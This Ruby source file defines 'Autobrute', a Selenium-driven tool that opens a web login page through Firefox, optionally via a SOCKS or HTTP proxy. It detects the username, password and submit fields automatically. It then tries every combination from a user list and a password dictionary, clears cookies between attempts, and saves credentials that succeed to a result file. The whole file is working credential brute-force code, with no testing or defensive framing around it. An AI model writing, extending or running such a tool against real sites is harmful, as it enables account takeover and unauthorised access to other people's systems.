begin
	require "selenium-webdriver"
rescue 
	puts "Selenium webdriver is not installed please install it: \"gem intall selenium-webdriver\""
end

class Autobrute
	def initialize(host,path,file,password,result_file,proxy,http_proxy)
		begin
			
			@base_url = host 
			@path = path
			puts host
			
		  if proxy == ""
				profile = Selenium::WebDriver::Firefox::Profile.new
				if http_proxy == ""
				  @driver = Selenium::WebDriver.for :firefox
				else
  				# Firefox profile configure HTTP(S) proxy
  				
  				proxy_info = http_proxy.split(":")
  				profile['network.proxy.http'] = proxy_info[0].to_s
  				profile['network.proxy.http_port'] = proxy_info[1].to_i
  				profile['network.proxy.ssl'] = proxy_info[0].to_s
  				profile['network.proxy.ssl_port'] = proxy_info[1].to_i
  				profile['network.proxy.type'] = 1
  				@driver = Selenium::WebDriver.for :firefox, :profile => profile
  			end
			else
				# Firefox profile configure socks proxy
				profile = Selenium::WebDriver::Firefox::Profile.new
				
				proxy_info = proxy.split(":")
				profile['network.proxy.socks'] = proxy_info[0].to_s
				profile['network.proxy.socks_port'] = proxy_info[1].to_i
				profile['network.proxy.type'] = 1

				@driver = Selenium::WebDriver.for :firefox, :profile => profile
			end
			
			
			@accept_next_alert = true
			@driver.manage.timeouts.implicit_wait = 30
			@verification_errors = []
			
			
			# Provide a file with a list of users 
			@file= file
			
			# Password file to use
			@password = password
			
			# Provide a result file where valid users and passwords will be stored
			@result_file = result_file
		rescue Exception => e  
			puts e.message
			puts "exception"
		end
		
			@username_input = ""
			@passwd_input = ""
			@button_input = ""
			@username_search = ""
			@passwd_search = ""
			@button_search = ""
	end
	
	def find_input
		# Assumes that there is only one form with two inputs and one submit button
		
		@driver.get(@base_url + @path)
		text_box = @driver.find_elements(:tag_name, "input")
		 i = 1 
		 text_box.each do |text|
			 
			#puts "	Type: " + text.attribute("type")
			#puts "	Name: " + text.attribute("name")			
			case text.attribute("type").to_s
			when "text"
				if text.attribute("id").to_s ==""
					@username_input = text.attribute("name").to_s
					@username_search = :name
				else
					@username_input = text.attribute("id").to_s
					@username_search = :id
				end
			when "password"
				if text.attribute("id").to_s == ""
					@passwd_input = text.attribute("name").to_s
					@passwd_search = :name
				else
					@passwd_input = text.attribute("id").to_s
					@passwd_search = :id
				end
			when "submit","image"			
				if text.attribute("name").to_s == ""
					puts text.attribute("id").to_s
					@button_input = text.attribute("id").to_s
				else text.attribute("id").to_s == ""
					@button_input = text.attribute("name").to_s 
					@button_search = :name
				end
			end
		end
		
		if @button_input == ""
			text_box = @driver.find_elements(:tag_name, "button")
			text_box.each do |text|
				if text.attribute("type").to_s == "submit" or text.attribute("type").to_s == "image" 
					if text.attribute("id").to_s == ""
						@button_input = text.attribute("name").to_s 
						@button_search = :name
					else text.attribute("id").to_s == ""
						@button_input = text.attribute("id").to_s
						@button_search = :id						
					end
				end
			end
		end
		
		if @button_input == ""
			@button_input = "//button[@type='submit']"					
			@button_search = :xpath
		end
		
		puts "Using username input: " + @username_input
		puts "Using password input: " + @passwd_input
		puts "Using submit button : " + @button_input
		
	end
		
	
	def brute_user_password
		## find input values
		find_input
		## find input values
		
		
		result = File.new(@result_file,'w+')
		
		p = ""
		if File.exists?(@password.to_s)
			p = File.new(@password,'r+')
		else
			p = File.new('dictionaries/passwd1','r+')
		end
		
		@driver.manage.delete_all_cookies
		
		p.each do |passwd|
		  f = File.new(@file,'r+')
			f.each do |user|
				user = user.to_s.strip
				passwd = passwd.to_s.strip
				puts "Testing User:#{user} Password:#{passwd}"
				
				
				@driver.find_element(@username_search, @username_input).clear
				@driver.find_element(@username_search, @username_input).send_keys user.to_s
				@driver.find_element(@passwd_search, @passwd_input).clear
				@driver.find_element(@passwd_search, @passwd_input).send_keys passwd.to_s
				
				@driver.find_element(@button_search, @button_input).click
								
				if element_present?(@button_search, @button_input)					
					#Wrong password
					@driver.manage.delete_all_cookies
				else
					puts "Yeah!!!!!!!!!!!!!! Correct password!   User:#{user} Password:#{passwd}"
					result.puts "User:#{user} Password:#{passwd}"	
					@driver.manage.delete_all_cookies
				end
			end
			f.close
		end
		
		p.close
		result.close
		@driver.quit
	end
	
	def element_present?(how, what)
	    @driver.find_element(how, what)
	    return true
	rescue Exception => e 
		puts e.message + "==> brute_user module autobrute"
		return false
	 end
  
	def verify(&blk)
		yield
	rescue ExpectationNotMetError => ex
		@verification_errors << ex
	end
  
	def close_alert_and_get_its_text(how, what)
		alert = @driver.switch_to().alert()
		if (@accept_next_alert) then
			alert.accept()
		else
			alert.dismiss()
		end
			alert.text
		ensure
			@accept_next_alert = true
	end
end


